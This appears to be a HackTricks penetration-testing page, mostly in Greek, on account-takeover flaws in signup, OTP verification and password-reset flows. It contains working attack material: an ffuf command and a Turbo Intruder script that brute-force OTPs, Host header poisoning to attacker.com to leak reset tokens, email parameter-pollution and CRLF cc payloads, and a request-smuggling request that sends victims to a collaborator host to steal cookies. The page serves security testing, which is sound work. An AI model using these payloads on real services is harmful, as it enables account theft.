# Ευπάθειες Εγγραφής & Αναλήψεων

{{#include ../banners/hacktricks-training.md}}

## Αναλήψεις Εγγραφής

### Διπλή Εγγραφή

- Προσπάθησε να δημιουργήσεις χρησιμοποιώντας ένα υπάρχον username
- Δοκίμασε παραλλαγές του email:
- κεφαλαία
- +1@
- πρόσθεσε κάποια τελεία στο email
- ειδικοί χαρακτήρες στο όνομα του email (%00, %09, %20)
- Βάλε κενά χαρακτήρες μετά το email: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Δοκίμασε τεχνικές κανονικοποίησης παρόχου email (εξαρτάται από την υπηρεσία):
- Gmail αγνοεί τις τελείες και το subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` παραδίδονται στο `victim@gmail.com`
- Ορισμένοι providers δεν κάνουν διάκριση πεζών/κεφαλαίων στο local-part
- Ορισμένοι πάροχοι δέχονται unicode confusables. Δοκίμασε homoglyphs και soft hyphen `\u00AD` μέσα στο local-part
- Κακοποίησε αυτά για: bypass uniqueness checks, απόκτηση duplicate accounts/workspace invites, ή να μπλοκάρεις τις εγγραφές του θύματος (temporary DoS) ενώ προετοιμάζεις takeover

### Username Enumeration

Έλεγξε αν μπορείς να καταλάβεις πότε ένα username έχει ήδη εγγραφεί στην εφαρμογή.

- Διαφορετικά μηνύματα σφάλματος ή HTTP status codes
- Διαφορές χρόνου (υπάρχων χρήστης μπορεί να προκαλέσει lookup σε IdP/DB)
- Autofill της φόρμας εγγραφής με δεδομένα προφίλ για γνωστά emails
- Έλεγξε team/invite flows: εισαγωγή email μπορεί να αποκαλύψει αν υπάρχει λογαριασμός

### Password Policy

Κατά τη δημιουργία χρήστη, έλεγξε την πολιτική κωδικών (έλεγξε αν μπορείς να χρησιμοποιήσεις αδύναμους κωδικούς).\
Σε αυτή την περίπτωση μπορείς να προσπαθήσεις bruteforce credentials.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement) για να μάθεις πώς να προσπαθήσεις account takeovers ή να εξάγεις πληροφορίες μέσω **SQL Injections** σε φόρμες εγγραφής.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Change Email

Αφού εγγραφείς, δοκίμασε να αλλάξεις το email και έλεγξε αν αυτή η αλλαγή επαληθεύεται σωστά ή αν μπορείς να την αλλάξεις σε αυθαίρετα emails.

### More Checks

- Έλεγξε αν μπορείς να χρησιμοποιήσεις **disposable emails** (mailinator, yopmail, 1secmail, etc.) ή να παρακάμψεις τη λίστα αποκλεισμού με subaddressing όπως `victim+mailinator@gmail.com`
- **Μακρύ** **κωδικός** (>200) οδηγεί σε **DoS**
- **Έλεγξε τα rate limits στη δημιουργία λογαριασμών**
- Χρησιμοποίησε username@**burp_collab**.net και ανέλυσε το **callback**
- Αν χρησιμοποιείται επαλήθευση με αριθμό τηλεφώνου, έλεγξε οριακές περιπτώσεις phone parsing/injection

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

## Αδύναμη Επαλήθευση Email/Τηλέφωνου (OTP/Magic Link)

Οι ροές εγγραφής συχνά επαληθεύουν την ιδιοκτησία μέσω αριθμητικού OTP ή token magic-link. Τυπικά σφάλματα:

- Μαντεύσιμο ή σύντομο OTP (4–6 ψηφία) χωρίς αποτελεσματικό rate limiting ή παρακολούθηση IP/device. Δοκίμασε παράλληλες μαντεψιές και rotation header/IP.
- Επαναχρησιμοποίηση OTP σε ενέργειες ή λογαριασμούς, ή μη σύνδεση με τον συγκεκριμένο χρήστη/ενέργεια (π.χ. ο ίδιος κωδικός δουλεύει για login και signup, ή δουλεύει μετά την αλλαγή email).
- Multi-value smuggling: μερικά backends αποδέχονται πολλαπλούς κωδικούς και επαληθεύουν αν οποιοσδήποτε ταιριάζει. Δοκίμασε:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: διάκριση wrong vs expired vs wrong-user codes από status/message/body length.
- Tokens που δεν invalidated μετά την επιτυχία ή μετά από αλλαγή password/email.
- Verification token που δεν συνδέεται με user agent/IP, επιτρέποντας cross-origin completion από σελίδες ελεγχόμενες από attacker.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Παράλληλη/συγχρονική δοκιμή μαντεύματος για να παρακαμφθούν σειριακοί αποκλεισμοί (χρησιμοποιήστε Turbo Intruder στο Burp):

<details>
<summary>Turbo Intruder snippet για να κατακλύσετε προσπάθειες 6‑ψηφίων OTP</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)

def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: υποβάλετε το ίδιο έγκυρο OTP ταυτόχρονα σε δύο συνεδρίες· μερικές φορές μία συνεδρία γίνεται verified attacker account ενώ η ροή του victim επίσης ολοκληρώνεται.
- Επίσης δοκιμάστε Host header poisoning σε verification links (όπως το reset poisoning παρακάτω) για to leak ή για να ολοκληρώσετε την επιβεβαίωση σε host ελεγχόμενο από attacker.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

Μια ισχυρή κατηγορία προβλημάτων προκύπτει όταν ο attacker πραγματοποιεί ενέργειες στο email του victim πριν ο victim δημιουργήσει τον λογαριασμό του, και μετά ανακτά πρόσβαση αργότερα.

Key techniques to test (adapt to the target’s flows):

- Classic–Federated Merge
- Attacker: registers a classic account with victim email and sets a password
- Victim: later signs up with SSO (same email)
- Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
- Attacker: creates account and holds a long‑lived session (don’t log out)
- Victim: recovers/sets password and uses the account
- Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
- Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
- Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
- Attacker: initiates email‑change to attacker mail and withholds confirmation
- Victim: recovers the account and starts using it
- Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
- Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
- Victim: signs up via classic route
- Service merges on email without checking `email_verified` or performing local verification

Πρακτικές συμβουλές

- Συλλέξτε ροές και endpoints από web/mobile bundles. Αναζητήστε classic signup, SSO linking, αλλαγή email/τηλεφώνου και endpoints password reset.
- Δημιουργήστε ρεαλιστική αυτοματοποίηση για να διατηρείτε τις συνεδρίες ενεργές ενώ δοκιμάζετε άλλες ροές.
- Για δοκιμές SSO, στήστε ένα test OIDC provider και εκδώστε tokens με `email` claims για τη διεύθυνση του victim και `email_verified=false` για να ελέγξετε αν το RP εμπιστεύεται unverified IdPs.
- Μετά από οποιοδήποτε password reset ή αλλαγή email, επαληθεύστε ότι:
  - όλες οι άλλες συνεδρίες και tokens αναιρούνται,
  - οι εκκρεμείς δυνατότητες αλλαγής email/τηλεφώνου ακυρώνονται,
  - οι προηγουμένως συνδεδεμένοι IdPs/emails/τηλέφωνα επαληθεύονται ξανά.

Σημείωση: Εκτενής μεθοδολογία και case studies αυτών των τεχνικών τεκμηριώνονται από την έρευνα της Microsoft για pre‑hijacking (βλ. References στο τέλος).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Ζητήστε password reset στη διεύθυνση email σας
2. Κάντε κλικ στον σύνδεσμο επαναφοράς κωδικού
3. Μην αλλάξετε τον κωδικό
4. Κάντε κλικ σε οποιονδήποτε ιστότοπο τρίτου (π.χ. Facebook, twitter)
5. Παρεμποδίστε το αίτημα στο Burp Suite proxy
6. Ελέγξτε αν το header referer είναι leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Παρεμποδίστε το password reset request στο Burp Suite
2. Προσθέστε ή επεξεργαστείτε τα παρακάτω headers στο Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Προωθήστε το αίτημα με το τροποποιημένο header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Αναζητήστε ένα password reset URL βασισμένο στο _host header_ όπως : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR σε Παραμέτρους API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Ο Attacker πρέπει να συνδεθεί με τον λογαριασμό του και να μεταβεί στη λειτουργία **Change password**.
2. Εκκινήστε το Burp Suite και κάντε Intercept το request
3. Στείλτε το στην καρτέλα repeater και επεξεργαστείτε τις παραμέτρους : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Αδύναμο Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Το password reset token πρέπει να παράγεται τυχαία και να είναι μοναδικό κάθε φορά.\
Προσπαθήστε να προσδιορίσετε αν το token λήγει ή αν είναι πάντα το ίδιο — σε ορισμένες περιπτώσεις ο αλγόριθμος δημιουργίας είναι αδύναμος και μπορεί να μαντευτεί. Οι παρακάτω μεταβλητές μπορεί να χρησιμοποιούνται από τον αλγόριθμο.

- Timestamp
- UserID
- Email χρήστη
- Όνομα και Επώνυμο
- Ημερομηνία γέννησης
- Κρυπτογραφία
- Μόνο αριθμοί
- Μικρή ακολουθία token (χαρακτήρες μεταξύ \[A-Z,a-z,0-9])
- Επαναχρησιμοποίηση token
- Ημερομηνία λήξης token

### Διαρροή Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Εκκινήστε ένα αίτημα επαναφοράς κωδικού χρησιμοποιώντας το API/UI για ένα συγκεκριμένο email π.χ: test@mail.com
2. Επιθεωρήστε την απάντηση του server και ελέγξτε για `resetToken`
3. Έπειτα χρησιμοποιήστε το token σε ένα URL όπως `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Επαναφορά Κωδικού μέσω Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Εγγραφείτε στο σύστημα με ένα username ίδιο με αυτό του victim, αλλά με κενά πριν και/ή μετά το username. π.χ: `"admin "`
2. Ζητήστε επαναφορά κωδικού με το malicious username σας.
3. Χρησιμοποιήστε το token που στάλθηκε στο email σας και επαναφέρετε το password του victim.
4. Συνδεθείτε στον λογαριασμό του victim με τον νέο κωδικό.

Η πλατφόρμα CTFd ήταν ευάλωτη σε αυτή την επίθεση.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover μέσω Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Βρείτε ένα XSS μέσα στην εφαρμογή ή σε subdomain αν τα cookies έχουν scope στο parent domain : `*.domain.com`
2. Leak το τρέχον **sessions cookie**
3. Αυθεντικοποιηθείτε ως ο χρήστης χρησιμοποιώντας το cookie

### Account Takeover μέσω HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Χρησιμοποιήστε **smuggler** για να ανιχνεύσετε το τύπο του HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Κατασκευάστε ένα request που θα overwrite το `POST / HTTP/1.1` με τα εξής δεδομένα:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` με στόχο να open redirect τους victims στο burpcollab και να κλέψετε τα cookies τους\
3. Το τελικό request μπορεί να μοιάζει με το ακόλουθο
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone reports exploiting this bug\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Κατάληψη λογαριασμού μέσω CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Δημιούργησε ένα payload για το CSRF, π.χ.: “φόρμα HTML με αυτόματη υποβολή για αλλαγή κωδικού”
2. Στείλε το payload

### Κατάληψη λογαριασμού μέσω JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token μπορεί να χρησιμοποιηθεί για να αυθεντικοποιήσει έναν χρήστη.

- Τροποποίησε το JWT με άλλο User ID / Email
- Έλεγξε για αδύναμη υπογραφή JWT


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Εγγραφή-ως-Επαναφορά (Upsert on Existing Email)

Μερικοί signup handlers εκτελούν upsert όταν το δοθέν email υπάρχει ήδη. Αν το endpoint δέχεται ένα ελάχιστο body με email και password και δεν επιβάλει έλεγχο ιδιοκτησίας, η αποστολή του email του θύματος θα αντικαταστήσει τον κωδικό του πριν την αυθεντικοποίηση.

- Ανακάλυψη: συλλογή ονομάτων endpoint από bundled JS (ή mobile app traffic), στη συνέχεια fuzz βασικές διαδρομές όπως /parents/application/v4/admin/FUZZ χρησιμοποιώντας ffuf/dirsearch.
- Υποδείξεις μεθόδου: ένα GET που επιστρέφει μηνύματα όπως "Only POST request is allowed." συχνά υποδεικνύει το σωστό verb και ότι αναμένεται JSON body.
- Ελάχιστο body που παρατηρήθηκε στην πράξη:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Παράδειγμα PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Επίπτωση: Full Account Takeover (ATO) χωρίς κανένα reset token, OTP, ή email verification.

## Αναφορές

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)

{{#include ../banners/hacktricks-training.md}}
